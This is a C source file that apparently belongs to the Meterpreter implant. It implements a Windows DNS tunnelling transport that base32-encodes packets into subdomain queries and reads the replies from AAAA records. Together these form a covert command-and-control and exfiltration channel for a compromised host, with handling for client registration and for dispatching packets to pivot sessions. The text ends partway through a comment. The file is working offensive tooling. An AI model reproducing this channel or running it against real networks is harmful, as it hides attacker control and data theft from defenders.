/*!
 * @file server_transport_windns.c
 * @remark This file doesn't use precompiled headers because metsrv.h includes a bunch of
 *         of definitions that clash with those found in winhttp.h. Hooray Win32 API. I hate you.
 */
#include "../../common/common.h"
#include "../../common/config.h"
#include "server_transport_windns.h"
#include "../../common/packet_encryption.h"
#include "../../common/pivot_packet_dispatch.h"

typedef enum {
    eSTATUS_SUCCESS,
    eSTATUS_BAD_DATA,
    eSTATUS_TRIES_EXCEED,
    eSTATUS_DNS_ERROR,
    eSTATUS_DNS_NO_RECORDS
} eDnsStatus;

static void ngx_txid_base32_encode(wchar_t *dst, const unsigned char *src, size_t len)
{
    const wchar_t *tbl = L"abcdefghijklmnopqrstuvwxyz234567";

    while (len > 0)
    {
        memset(dst, 0, 8 * sizeof(wchar_t));

        switch (len)
        {
            default:
                dst[7] |= src[4] & 0x1F;
                dst[6] |= src[4] >> 5;
            case 4:
                dst[6] |= (src[3] << 3) & 0x1F;
                dst[5] |= (src[3] >> 2) & 0x1F;
                dst[4] |= src[3] >> 7;
            case 3:
                dst[4] |= (src[2] << 1) & 0x1F;
                dst[3] |= (src[2] >> 4) & 0x1F;
            case 2:
                dst[3] |= (src[1] << 4) & 0x1F;
                dst[2] |= (src[1] >> 1) & 0x1F;
                dst[1] |= (src[1] >> 6) & 0x1F;
            case 1:
                dst[1] |= (src[0] << 2) & 0x1F;
                dst[0] |= src[0] >> 3;
        }

        int j;
        for (j = 0; j < 8; j++)
        {
            dst[j] = tbl[dst[j]];
        }

        if (len < 5)
        {
            dst[7] = L'=';
            if (len < 4)
            {
                dst[6] = L'=';
                dst[5] = L'=';
                if (len < 3)
                {
                    dst[4] = L'=';
                    if (len < 2)
                    {
                        dst[3] = L'=';
                        dst[2] = L'=';
                    }
                }
            }
            break;
        }

        len -= 5;
        src += 5;
        dst += 8;
    }
}

static size_t ngx_txid_base32_encode_len(size_t len)
{
    return (len + 4) / 5 * 8;
}

static size_t request_format(wchar_t* buffer, size_t buffer_size, const wchar_t* format, ...)
{
    memset(buffer, 0, buffer_size);
    size_t num_of_elem = buffer_size / sizeof(wchar_t);
    va_list args;
    va_start(args, format);
    size_t size = _vsnwprintf_s(buffer, num_of_elem, _TRUNCATE, format, args);
    va_end(args);
    buffer[size] = L'\0';
    return size;
}

static eDnsStatus do_dns_request(DnsRequestContext* request_context)
{
    eDnsStatus result = eSTATUS_SUCCESS;
    DNS_STATUS dns_status = 0;
    USHORT counter = request_context->start_index;
    size_t num_tries = request_context->num_tries;
    wchar_t* start_buf = request_context->request + request_context->num_written;
    size_t buf_size = sizeof(request_context->request) - (sizeof(wchar_t) * request_context->num_written);

    do
    {
        request_format(start_buf, buf_size, L"%d.%s.%s", counter, request_context->id, request_context->domain);
        vdprintf("[WINDNS do_dns_request] Starting query for domain name %ls, out - %p", request_context->request, &request_context->records);
        dns_status = DnsQuery_W(request_context->request, request_context->request_type,
                                DNS_QUERY_RETURN_MESSAGE | DNS_QUERY_BYPASS_CACHE | DNS_QUERY_NO_HOSTS_FILE,
                                request_context->pSrvList, &request_context->records, NULL);
        ++counter;
        if (dns_status != 0)
        {
            vdprintf("[PACKET RECEIVE WINDNS] Dns query returns error %d.Retry.", dns_status);
            Sleep(100);
        }
        else
        {
            vdprintf("[PACKET RECEIVE WINDNS] Dns query done successfully.");
        }
    } while ((num_tries-- > 0) && (dns_status != 0));

    if (num_tries == 0)
    {
        vdprintf("[PACKET RECEIVE WINDNS] Number of tries is exceeded");
        result = eSTATUS_TRIES_EXCEED;
    }
    else if (dns_status != 0)
    {
        result = eSTATUS_DNS_ERROR;
    }
    return result;
}

static DnsRequestContext* create_request_context(WORD request_type, const wchar_t* id, const wchar_t* domain, PIP4_ARRAY pSrvList)
{
    DnsRequestContext* ptr = (DnsRequestContext*) malloc(sizeof(DnsRequestContext));
    if (ptr == NULL)
    {
        vdprintf("[WINDNS CREATE CONTEXT] Can't allocate memory for DnsRequestContext");
        return ptr;
    }

    memset(ptr, 0, sizeof(*ptr));
    ptr->start_index = ((UINT)ptr +  GetTickCount()) % 7812;
    vdprintf("[PACKET CREATE CONTEXT] random start index is %ud", ptr->start_index);
    ptr->num_tries = 1000;
    ptr->request_type = request_type;
    ptr->id = id;
    ptr->domain = domain;
    ptr->pSrvList = pSrvList;
    ptr->records = NULL;
    vdprintf("[WINDNS CREATE CONTEXT] domain - %ls, id - %ls, pSrvList - %p ", ptr->domain, ptr->id, ptr->pSrvList);
    return ptr;
}

static void free_request_context(DnsRequestContext** ppContext)
{
    DnsRequestContext* ptr_context = *ppContext;

    if (ptr_context == NULL)
    {
        return;
    }

    if (ptr_context->records != NULL)
    {
        DnsRecordListFree(ptr_context->records, DnsFreeRecordList);
        ptr_context->records = NULL;
    }
    free(ptr_context);
    *ppContext = NULL;
}

static void free_request_new_request(DnsRequestContext* context)
{
    if (context->records != NULL)
    {
        DnsRecordListFree(context->records, DnsFreeRecordList);
        context->records = NULL;
    }
    context->start_index = ((UINT)context +  GetTickCount()) % 7812;
    vdprintf("[PACKET NEW REQUEST] random start index is %ud", context->start_index);
}

static void prepare_data_request(const wchar_t* sub_domain, size_t cur_idx, DnsRequestContext* request_context)
{
    memset(request_context->request, 0, sizeof(request_context->request));
    request_context->num_written = 0;
    request_context->num_written = request_format(request_context->request, sizeof(request_context->request), L"%s.%d.", sub_domain, cur_idx);
}

static void prepare_data_header_request(const wchar_t* sub_domain, const wchar_t* reqz, DnsRequestContext* request_context)
{
    memset(request_context->request, 0, sizeof(request_context->request));
    request_context->num_written = 0;
    request_context->num_written = request_format(request_context->request, sizeof(request_context->request), L"%s.%s.", sub_domain, reqz);
}

static void prepare_send_header_request(size_t num_send, size_t padd, DnsRequestContext* request_context)
{
    memset(request_context->request, 0, sizeof(request_context->request));
    request_context->num_written = 0;
    request_context->num_written = request_format(request_context->request, sizeof(request_context->request), L"%u.%u.tx.", num_send, padd);
}

static void prepare_register_request(DnsRequestContext* request_context)
{
    memset(request_context->request, 0, sizeof(request_context->request));
    request_context->num_written = 0;
    request_context->num_written = request_format(request_context->request, sizeof(request_context->request), L"%s", L"7812.reg0.");
}

static void prepare_send_data_request(DnsRequestContext* request_context, size_t index, const wchar_t* data, size_t* data_size)
{
    memset(request_context->request, 0, sizeof(request_context->request));
    request_context->num_written = 0;
    //reserved length for domain name, id name, counter
    size_t reserved_len = wcslen(request_context->domain) + wcslen(request_context->id) + 5; // 5 dots
    wchar_t tmp[16];
    _itow_s(request_context->num_tries, tmp, sizeof(tmp), 10);
    reserved_len += wcslen(tmp);
    _itow_s(index, tmp, sizeof(tmp), 10);
    size_t index_len = wcslen(tmp);
    reserved_len += index_len;

    //format: t. sub_name . sub_name . sub_name . ...
    wchar_t* ptr = request_context->request;
    size_t max_size = (sizeof(request_context->request)/ sizeof(wchar_t)) - reserved_len;
    wcsncpy_s(ptr, max_size, L"t.", 2);
    max_size -= 2;
    ptr += 2;

    //compute number of sub_domains for one dns request
    size_t rest_len = min(max_size - 1, *data_size); // reserve one symbol for terminated null
    size_t parts = rest_len / (MAX_DNS_SUBNAME_SIZE + 1);
    size_t parts_last = rest_len % (MAX_DNS_SUBNAME_SIZE + 1);

    const wchar_t* ptr_data = data;
    for (size_t i = 0; i < parts; i++)
    {
        wcsncpy_s(ptr, max_size, ptr_data, MAX_DNS_SUBNAME_SIZE);
        max_size -= MAX_DNS_SUBNAME_SIZE;
        ptr += MAX_DNS_SUBNAME_SIZE;
        ptr_data += MAX_DNS_SUBNAME_SIZE;
        *ptr = L'.';
        ++ptr;
        --max_size;
    }

    if (parts_last > 0)
    {
        wcsncpy_s(ptr, max_size, ptr_data, parts_last);
        max_size -= parts_last;
        ptr += parts_last;
        ptr_data += parts_last;
        *ptr = L'.';
        ++ptr;
    }

    //copy index value
    wcsncpy_s(ptr, index_len + 1, tmp, index_len);
    ptr += index_len;
    *ptr = L'.';
    ++ptr;

    request_context->num_written = ptr - request_context->request;
    //save number of bytes used from data
    *data_size = ptr_data - data;
}

static eDnsStatus process_register_answer(PDNS_RECORD records, DnsTransportContext* ctx)
{
    DnsTunnel* dns_tunnel = NULL;
    eDnsStatus result = eSTATUS_SUCCESS;

    if (records->Data.AAAA.Ip6Address.IP6Byte != NULL)
    {
        PDNS_RECORD result_iter = records;
        do
        {
            DnsTunnel* tmp = ((DnsTunnel *)result_iter->Data.AAAA.Ip6Address.IP6Byte);

            if ((UCHAR)(tmp->index_size) == 0xff && tmp->ff == 0xff)
            {
                dns_tunnel = tmp;
                break;
            }
            result_iter = result_iter->pNext;
        } while (result_iter != NULL);

        if (dns_tunnel != NULL && dns_tunnel->block.data[1] == 0)
        {
            vdprintf("[PACKET RECEIVE WINDNS] CLIENT ID: '%x'", dns_tunnel->block.data[0]);
            SAFE_FREE(ctx->client_id);
            ctx->client_id = (wchar_t*)calloc(2,sizeof(wchar_t));
            swprintf(ctx->client_id, 2*sizeof(wchar_t), L"%c", dns_tunnel->block.data[0]);
            ctx->ready = TRUE;
        }
        else
        {
            vdprintf("[PACKET RECEIVE WINDNS] HEADER NOT FOUND error");
            result = eSTATUS_BAD_DATA;
        }
    }
    else
    {
        vdprintf("[PACKET RECEIVE WINDNS] NO IP");
        result = eSTATUS_DNS_NO_RECORDS;
    }
    return result;
}

static eDnsStatus process_data_header_answer(PDNS_RECORD records, size_t* data_size, wchar_t* next_sub_seq)
{
    DnsTunnel* dns_tunnel = NULL;
    eDnsStatus result = eSTATUS_SUCCESS;

    if (records->Data.AAAA.Ip6Address.IP6Byte != NULL)
    {
        PDNS_RECORD result_iter = records;
        do
        {
            DnsTunnel* tmp = ((DnsTunnel *)result_iter->Data.AAAA.Ip6Address.IP6Byte);


            if ((UCHAR)(tmp->index_size) == 0x81 && tmp->ff == 0xfe)
            {
                dns_tunnel = tmp;
                break;
            }
            result_iter = result_iter->pNext;
        } while (result_iter != NULL);


        if (dns_tunnel != NULL && (dns_tunnel->block.header.status_flag == 0 || dns_tunnel->block.header.status_flag == 1))
        {
            memcpy(next_sub_seq, dns_tunnel->block.header.next_sub_seq, 8);
            *data_size = dns_tunnel->block.header.size;
        }
        else
        {
            vdprintf("[PACKET RECEIVE WINDNS] HEADER NOT FOUND error");
            result = eSTATUS_BAD_DATA;
        }
    }
    else
    {
        vdprintf("[PACKET RECEIVE WINDNS] NO IP");
        result = eSTATUS_DNS_NO_RECORDS;
    }
    return result;
}

static eDnsStatus process_data_answer(PDNS_RECORD records, DNSThreadParams *lpParam)
{
    eDnsStatus result = eSTATUS_SUCCESS;
    DnsTunnel* xxx[17];
    memset(xxx, 0, sizeof(xxx));
    size_t current_recieved = 0;

    if (records->Data.AAAA.Ip6Address.IP6Byte != NULL)
    {
        PDNS_RECORD result_iter = records;

        do
        {
            DnsTunnel* tmp = ((DnsTunnel *)result_iter->Data.AAAA.Ip6Address.IP6Byte);

            if (tmp->ff == 0xfe)
            {
                xxx[16] = tmp;
            }
            else if (tmp->ff == 0xff)
            {
                UINT idx = ((UCHAR)(tmp->index_size) >> 4);
                if (idx < 16) {
                    xxx[idx] = tmp;
                }
                else
                {
                    vdprintf("[PACKET RECEIVE WINDNS] DNS INDEX error");
                    return eSTATUS_BAD_DATA;
                }

            }
            else
            {
                vdprintf("[PACKET RECEIVE WINDNS] DNS FLAG error");
                return eSTATUS_BAD_DATA;
            }
            result_iter = result_iter->pNext;
        } while (result_iter != NULL);


        size_t i = 0;
        while (i < 17 && xxx[i] != NULL)
        {
            if ((xxx[i]->index_size & 0x0f) <= 0x0e)
            {
                memcpy(lpParam->result + lpParam->size, xxx[i]->block.data, (xxx[i]->index_size & 0x0f)); // copy packet
                current_recieved = (xxx[i]->index_size & 0x0f);
                lpParam->size += current_recieved;
            }
            else
            {
                vdprintf("[PACKET RECEIVE WINDNS] INDEX2 overflow error");
                return eSTATUS_BAD_DATA;
            }
            i++;
        }
    }
    else
    {
        result = eSTATUS_DNS_NO_RECORDS;
    }

    return result;
}

DWORD WINAPI DnsGetDataThreadProc(DNSThreadParams *lpParam)
{
    eDnsStatus dns_status = 0;
    DnsRequestContext* context = create_request_context(DNS_TYPE_AAAA, lpParam->client_id, lpParam->domain, lpParam->pSrvList);

    for (int cur_idx = lpParam->index; cur_idx < lpParam->index_stop; cur_idx++)
    {
        prepare_data_request(lpParam->subd, cur_idx, context);
        dns_status = do_dns_request(context);

        if (dns_status == eSTATUS_SUCCESS)
        {
            lpParam->status = process_data_answer(context->records, lpParam);
            free_request_new_request(context);
        }
        else
        {
            vdprintf("[PACKET RECEIVE WINDNS] dns request returns error %d", dns_status);
            lpParam->status = dns_status;
            lpParam->size = 0;
            break;
        }
    }

    free_request_context(&context);
    ExitThread(0);
}


/*!
 * @brief Wrapper around DNS-specific sending functionality.
 * @param hReq DNS request domain.
 * @return An indication of the result of sending the request.
 */
BOOL get_packet_from_windns(wchar_t * domain, wchar_t * sub_seq, PUSHORT counter, IncapsulatedDns *recieve,
                            PIP4_ARRAY pip4, wchar_t* reqz, wchar_t* client_id)
{
    size_t current_recieved = 0;
    size_t need_to_recieve = 0;
    BOOL ready = FALSE;
    eDnsStatus dns_status;
    wchar_t *sub_seq_orig = _wcsdup(sub_seq);

    DnsRequestContext* context = create_request_context(DNS_TYPE_AAAA, client_id, domain, pip4);
    // request data size and next subdomain
    prepare_data_header_request(sub_seq, reqz, context);
    dns_status = do_dns_request(context);
    vdprintf("[PACKET RECEIVE WINDNS] DnsQuery status code is %d", dns_status);

    if (dns_status == eSTATUS_SUCCESS)
    {
        dns_status = process_data_header_answer(context->records, &need_to_recieve, sub_seq);
    }
    free_request_context(&context);

    //there is a new data, get it
    if (need_to_recieve > 0)
    {
        //allocate memory for packet
        recieve->packet = (PUCHAR)calloc(need_to_recieve, sizeof(char));
        vdprintf("[PACKET RECEIVE WINDNS] need to get bytes: %d", need_to_recieve);
        HANDLE hThreads[THREADS_MAX];
        DNSThreadParams thread_params[THREADS_MAX];

        size_t num_requests = need_to_recieve / 238 + ((need_to_recieve % 238) > 0 ? 1 : 0);
        vdprintf("[PACKET RECEIVE WINDNS] need make %d requests", num_requests);

        size_t iterations = num_requests / (THREADS_MAX);
        size_t iterations_last = (num_requests % THREADS_MAX);
        size_t curr_idx = 0;
        HANDLE hMutex = CreateMutex(NULL, FALSE, NULL);

        int created_threads = 0;
        if (num_requests <= THREADS_MAX)
        {
            iterations = 1;
            iterations_last = 1;
            created_threads = num_requests;
        }
        else
        {
            created_threads = THREADS_MAX;
            iterations_last += iterations;
        }

        vdprintf("[PACKET RECEIVE WINDNS] will do in %d threads  - %d, %d", created_threads, iterations, iterations_last);

        for (int y = 0; y < created_threads ; y++)
        {
            size_t last_idx = curr_idx + ( y == (THREADS_MAX - 1) ? iterations_last : iterations );
            thread_params[y].mutex = &hMutex;
            thread_params[y].domain = domain;
            thread_params[y].client_id = client_id;
            thread_params[y].subd = sub_seq_orig;
            thread_params[y].pSrvList = pip4;
            thread_params[y].result = (UCHAR *)calloc(238 * ( y == (THREADS_MAX - 1) ? iterations_last : iterations ), sizeof(UCHAR));
            thread_params[y].size = 0;
            thread_params[y].status = 1;
            thread_params[y].index = curr_idx;
            thread_params[y].index_stop = last_idx;

            vdprintf("[PACKET RECEIVE WINDNS] START %d .. %d %S %S", curr_idx, last_idx, domain, sub_seq_orig);

            hThreads[y] = CreateThread(NULL, 0, &DnsGetDataThreadProc, &thread_params[y], 0, NULL);

            if (NULL == hThreads[y])
            {
                vdprintf("Failed to create thread.\r\n");
            }

            curr_idx = last_idx;
        }


        WaitForMultipleObjects(created_threads, hThreads, TRUE, INFINITE);

        for (int y = 0; y < created_threads; y++)
        {
            vdprintf("[PACKET RECEIVE WINDNS] FINISH got %S, %d [%d]", thread_params[y].subd, thread_params[y].size,y);
            if ((thread_params[y].status == eSTATUS_SUCCESS) && thread_params[y].size > 0)
            {

                memcpy(recieve->packet + current_recieved, thread_params[y].result, thread_params[y].size);
                current_recieved += thread_params[y].size;
            }
            else
            {
                dns_status = thread_params[y].status;
            }

            //CLEAN
            thread_params[y].domain = NULL;
            thread_params[y].client_id = NULL;
            thread_params[y].subd = NULL;
            thread_params[y].status = 1;
            SAFE_FREE(thread_params[y].result);
            thread_params[y].size = 0;
        }
    }

    SAFE_FREE(sub_seq_orig);

    vdprintf("[PACKET RECEIVE WINDNS] recieved %d bytes from %d", current_recieved, need_to_recieve);

    if (need_to_recieve == current_recieved)
    {

        if (need_to_recieve == 0)
        {
            recieve->status = DNS_INFO_NO_RECORDS;
            recieve->size = 0;
            vdprintf("[PACKET RECEIVE WINDNS] NO RECORDS");
        }
        else
        {
            recieve->status = ERROR_SUCCESS;
            recieve->size = need_to_recieve;
            vdprintf("[PACKET RECEIVE WINDNS] PACKET READY");
        }
    }
    else
    {
        if (recieve->packet != NULL)
        {
            SAFE_FREE(recieve->packet);
            recieve->size = 0;
        }

        vdprintf("[PACKET RECEIVE WINDNS] recv. error %d", dns_status);
        recieve->status = ERROR_READ_FAULT;
        recieve->size = 0;
        return FALSE;
    }

    vdprintf("[PACKET RECEIVE WINDNS] packet recieved with size (%d)",recieve->size);
    return TRUE;
}

/*!
 * @brief Wrapper around DNS-specific sending functionality.
 * @param hReq DNS request handle.
 * @param buffer Pointer to the buffer to receive the data.
 * @param size Buffer size.
 * @return An indication of the result of sending the request.
 */
static BOOL send_request_windns(wchar_t * domain, wchar_t * subdomain, wchar_t* reqz, PUSHORT counter, PIP4_ARRAY pip4,
                                LPVOID buffer, DWORD size, wchar_t* client_id, IncapsulatedDns *recieved)
{
    BOOL result = FALSE;

    if(buffer == NULL || size == 0)
    {
        result = get_packet_from_windns(domain, subdomain, counter, recieved, pip4, reqz, client_id);
    }
    else if (buffer != NULL && size > 0)
    {
        result = FALSE;
    }

    return result;
}


/*!
 * @brief Windows-specific function to transmit a packet via DNS
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet that is to be sent.
 * @param completion Pointer to the completion routines to process.
 * @return An indication of the result of processing the transmission request.
 * @remark This function is not available on POSIX.
 */
static DWORD packet_transmit_dns(Remote *remote, LPBYTE packet, DWORD packetLength)
{
    DWORD ret = 0;
    DnsTransportContext* ctx = (DnsTransportContext*)remote->transport->ctx;
    wchar_t *base64 = NULL;
    size_t index = 0;
    size_t need_to_send = 0;
    eDnsStatus dns_status;

    if (ctx->ready == FALSE)
    {
        SetLastError(ERROR_NOT_FOUND);
        return 0;
    }

    vdprintf("[PACKET TRANSMIT WINDNS] Packet: %p - size %d", packet, packetLength);
    need_to_send = ngx_txid_base32_encode_len(packetLength);
    base64 = (wchar_t *)calloc(need_to_send + 1, sizeof(wchar_t));

    ngx_txid_base32_encode(base64, packet, packetLength);

    DWORD padd_ = 0;
    //compute number of padding symbols
    while (base64[need_to_send - 1] == L'=')
    {
        --need_to_send;
        padd_++;
    };

    vdprintf("[PACKET TRANSMIT WINDNS] BASE64: padding = %d, '%S'", padd_, base64);
    base64[need_to_send] = L'\0';

    DnsRequestContext* context = create_request_context(DNS_TYPE_AAAA, ctx->client_id, ctx->domain, ctx->pip4);
    do
    {
        prepare_send_header_request(need_to_send, padd_, context);
        dns_status = do_dns_request(context);

        if (dns_status != eSTATUS_SUCCESS)
        {
            ret = dns_status;
            break;
        }

        DnsTunnel* tmp = ((DnsTunnel *)context->records->Data.AAAA.Ip6Address.IP6Byte);
        if (tmp == NULL || tmp->block.header.status_flag != 0)
        {
            vdprintf("[PACKET TRANSMIT WINDNS] Header error");
            ret = DNS_ERROR_INVALID_IP_ADDRESS;
            break;
        }

        wchar_t* ptr_data = base64;
        size_t data_size = need_to_send;
        do
        {
            size_t num_written = data_size;
            free_request_new_request(context);
            prepare_send_data_request(context, index, ptr_data, &num_written);
            ptr_data += num_written;
            data_size -= num_written;

            dns_status = do_dns_request(context);

            if (dns_status == eSTATUS_SUCCESS)
            {
                if (context->records->Data.AAAA.Ip6Address.IP6Byte != NULL)
                {
                    DnsTunnel* tmp = ((DnsTunnel *)context->records->Data.AAAA.Ip6Address.IP6Byte);
                    if (tmp->index_size == 0xff && tmp->block.header.status_flag == 0xf0)
                    {
                        index++;
                        vdprintf("[PACKET TRANSMIT WINDNS] sent: %d from %d", need_to_send - data_size, need_to_send);
                    }
                    else if((tmp->index_size == 0xff) && (tmp->block.header.status_flag == 0xff))
                    {
                        vdprintf("[PACKET TRANSMIT WINDNS] repeat (finish): sent %d from %d bytes", need_to_send - data_size, need_to_send);
                    }
                    else
                    {
                        // ERROR
                        vdprintf("[PACKET TRANSMIT WINDNS] response error, wrong header 0x%x (%d from %d)", tmp->block.header.status_flag, need_to_send - data_size, need_to_send);
                        ret = DNS_ERROR_INVALID_IP_ADDRESS;
                        break;
                    }
                }
                else
                {
                    vdprintf("[PACKET TRANSMIT WINDNS] response error, no data");
                    ret = DNS_ERROR_NO_PACKET;
                    break;
                }
            }
            else
            {
                vdprintf("[PACKET TRANSMIT WINDNS] Can't send data");
                ret = DNS_ERROR_NO_PACKET;
                break;
            }

        } while (data_size != 0);

        if (data_size == 0)
        {
            ret = ERROR_SUCCESS;
        }
    } while (FALSE);

    SAFE_FREE(base64);
    free_request_context(&context);
    return ret;
}

/*!
 * @brief Transmit a packet via DNS.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the \c Packet that is to be sent.
 * @param completion Pointer to the completion routines to process.
 * @return An indication of the result of processing the transmission request.
 */
static DWORD packet_transmit_via_dns(Remote *remote, LPBYTE rawPacket, DWORD rawPacketLength)
{
    DWORD res;
    dprintf("[PACKET DNS] TRANSMIT... 1 %p", rawPacket);
    lock_acquire(remote->lock);
    do
    {
        res = packet_transmit_dns(remote, rawPacket, rawPacketLength);
        if (res != 0)
        {
            dprintf("[PACKET] transmit failed with return %d\n", res);
            SetLastError(res);
            break;
        }

        SetLastError(ERROR_SUCCESS);
    } while (0);

    res = GetLastError();
    lock_release(remote->lock);
    return res;
}

/*!
 * @brief Windows-specific function to register a new client via DNS.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to a pointer that will receive the \c Packet data.
 * @return An indication of the result of processing the transmission request.
 * @remark This function is not available in POSIX.
 */
static BOOL register_dns(DnsTransportContext* ctx)
{
    BOOL ready = FALSE;
    eDnsStatus dns_status;

    DnsRequestContext* context = create_request_context(DNS_TYPE_AAAA, ctx->server_id, ctx->domain, ctx->pip4);
    context->num_tries = 10;

    prepare_register_request(context);
    dns_status = do_dns_request(context);

    if (dns_status == eSTATUS_SUCCESS)
    {
        process_register_answer(context->records, ctx);

    }
    free_request_context(&context);

    return ctx->ready;
}

/*!
 * @brief Windows-specific function to receive a new packet via DNS.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to a pointer that will receive the \c Packet data.
 * @return An indication of the result of processing the transmission request.
 * @remark This function is not available in POSIX.
 */
static DWORD packet_receive_dns(Remote *remote, Packet **packet)
{
    DWORD headerBytes = 0, payloadBytesLeft = 0, res = ERROR_SUCCESS;
    Packet *localPacket = NULL;
    PacketHeader header;
    //LONG bytesRead;
    BOOL inHeader = TRUE;
    PUCHAR payload = NULL;
    ULONG payloadLength = 0;
    DnsTransportContext* ctx = (DnsTransportContext*)remote->transport->ctx;
    DWORD retries = 5;
    IncapsulatedDns recieved;
    wchar_t *sub_seq = L"aaaa";

    recieved.packet = NULL;

    lock_acquire(remote->lock);

    if (ctx->ready == TRUE)
    {
        vdprintf("[PACKET RECEIVE DNS] sending req: %S", ctx->domain);
        BOOL rcvStatus = send_request_windns(ctx->domain, sub_seq, L"g", &ctx->counter, ctx->pip4, NULL, 0, ctx->client_id, &recieved);

        if (rcvStatus == TRUE && recieved.status == ERROR_SUCCESS) // Handle response
        {
            vdprintf("[PACKET RECEIVE DNS] Data recieved: %u bytes", recieved.size);

            //read header
            memcpy(&header, recieved.packet, sizeof(PacketHeader));
            dprintf("[PACKET RECEIVE DNS] decoding header");

            // xor the header data
            xor_bytes(header.xor_key, (PUCHAR)&header + sizeof(header.xor_key), sizeof(PacketHeader) - sizeof(header.xor_key));
#ifdef DEBUGTRACE
            PUCHAR h = (PUCHAR)&header;
            vdprintf("[PACKET RECEIVE DNS] Packet header: [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X]",
                h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15], h[16], h[17], h[18], h[19], h[20], h[21], h[22], h[23], h[24], h[25], h[26], h[27], h[28], h[29], h[30], h[31]);
#endif
            //header.length = ntohl(header.length);
            //dprintf("[PACKET RECEIVE DNS] key:0x%x len:0x%x",header.xor_key, header.length);
            // Initialize the header
            vdprintf("[PACKET RECEIVE DNS] tlv length: %d", ntohl(header.length));
            // use TlvHeader size here, because the length doesn't include the xor byte
            payloadLength = ntohl(header.length) - sizeof(TlvHeader);
            vdprintf("[PACKET RECEIVE DNS] Payload length is %d", payloadLength);
            DWORD packetSize = sizeof(PacketHeader) + payloadLength;
            vdprintf("[PACKET RECEIVE DNS] total buffer size for the packet is %d", packetSize);
            // Allocate the payload
            if (!(payload = (PUCHAR)malloc(packetSize)))
            {
                SetLastError(ERROR_NOT_ENOUGH_MEMORY);
                vdprintf("[PACKET RECEIVE DNS] ERROR_NOT_ENOUGH_MEMORY");

            }
            else
            {

                dprintf("[PACKET RECEIVE DNS] alloc %d", packetSize);
                memcpy_s(payload, packetSize, recieved.packet, packetSize);

#ifdef DEBUGTRACE
                h = (PUCHAR)&header.session_guid[0];
                dprintf("[PACKET RECEIVE DNS] Packet Session GUID: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X",
                    h[0], h[1], h[2], h[3], h[4], h[5], h[6], h[7], h[8], h[9], h[10], h[11], h[12], h[13], h[14], h[15]);
#endif
                if (is_null_guid(header.session_guid) || memcmp(remote->orig_config->session.session_guid, header.session_guid, sizeof(header.session_guid)) == 0)
                {
                    dprintf("[PACKET RECEIVE DNS] Session GUIDs match (or packet guid is null), decrypting packet");
                    SetLastError(decrypt_packet(remote, packet, payload, packetSize));
                }
                else
                {
                    dprintf("[TCP] Session GUIDs don't match, looking for a pivot");
                    PivotContext* pivotCtx = pivot_tree_find(remote->pivot_sessions, header.session_guid);
                    if (pivotCtx != NULL)
                    {
                        dprintf("[TCP] Pivot found, dispatching packet on a thread (to avoid main thread blocking)");
                        SetLastError(pivot_packet_dispatch(pivotCtx, payload, packetSize));

                        // mark this packet buffer as NULL as the thread will clean it up
                        payload = NULL;
                        *packet = NULL;
                    }
                    else
                    {
                        dprintf("[TCP] Session GUIDs don't match, can't find pivot!");
                    }
                }
            }

            // Cleanup on failure
            if (res != ERROR_SUCCESS)
            {
                if (payload)
                {
                    free(payload);
                }
                if (localPacket)
                {
                    free(localPacket);
                }
            }


        }
        else if (recieved.status == DNS_INFO_NO_RECORDS) // No data
        {

            SetLastError(DNS_INFO_NO_RECORDS);
            res = DNS_INFO_NO_RECORDS;

        }
        else if (recieved.status == ERROR_READ_FAULT){ // ERROR

            SetLastError(ERROR_READ_FAULT);
            res = ERROR_READ_FAULT;

        }
        else
        {

            SetLastError(ERROR_READ_FAULT);
            res = ERROR_READ_FAULT;

        }
    }
    else
    { // Register

        vdprintf("[PACKET RECEIVE DNS] sending reg req: %S", ctx->domain);
        BOOL rcvStatus = register_dns(ctx);

        if (rcvStatus == TRUE) // Handle response
        {
            vdprintf("[PACKET RECEIVE DNS] Registred. New CLIENT ID: '%s'", ctx->client_id);
            SetLastError(DNS_INFO_NO_RECORDS);
            res = DNS_INFO_NO_RECORDS;
        }
        else
        {
            vdprintf("[PACKET RECEIVE DNS] Registration failed!");
            SetLastError(DNS_INFO_NO_RECORDS);
            res = DNS_INFO_NO_RECORDS;

        }
    }

    lock_release(remote->lock);

    return res;
}


/*!
 * @brief Initialise the DNS connection (WSAScoket).
 * @param remote Pointer to the remote instance with the DNS transport details wired in.
 * @return Indication of success or failure.
 */
static BOOL server_init_windns(Transport* transport)
{
    DnsTransportContext* ctx = (DnsTransportContext*)transport->ctx;
    PIP4_ARRAY pSrvList = NULL;
    dprintf("[WINDNS] Initialising ...");


    if (ctx->ns_server != NULL && wcscmp(ctx->ns_server, L"") != 0)
    {
        char temp[MAX_PATH];
        dprintf("[WINDNS] NS SERVER %S", ctx->ns_server);
        sprintf_s(temp, MAX_PATH, "%S", ctx->ns_server);
        pSrvList = (PIP4_ARRAY)calloc(1, sizeof(IP4_ARRAY));
        DWORD ip;
        inet_pton(AF_INET, temp, (PVOID)&ip);
        pSrvList->AddrArray[0] = ip;
        pSrvList->AddrCount = 1;
    }
    ctx->pip4 = (PVOID)pSrvList;

    if (ctx->client_id == NULL || ctx->client_id[0] == L'\0' || ctx->client_id[0] == L'0')
    {
        dprintf("[WINDNS] DNS Ready for reg");
        ctx->ready = FALSE;
    }
    else
    {
        dprintf("[WINDNS] DNS already registred with CLIENT_ID %S", ctx->client_id);
        ctx->ready = TRUE;
    }

    return TRUE;
}

/*!
 * @brief Deinitialise the DNS connection.
 * @param remote Pointer to the remote instance with the DNS transport details wired in.
 * @return Indication of success or failure.
 */
static DWORD server_deinit_dns(Transport* transport)
{
    DnsTransportContext* ctx = (DnsTransportContext*)transport->ctx;

    dprintf("[DNS] Deinitialising ...");

    if (ctx->ready == TRUE)
    {
        ctx->ready = FALSE;
    }

    SAFE_FREE(ctx->pip4);
    return TRUE;
}

/*!
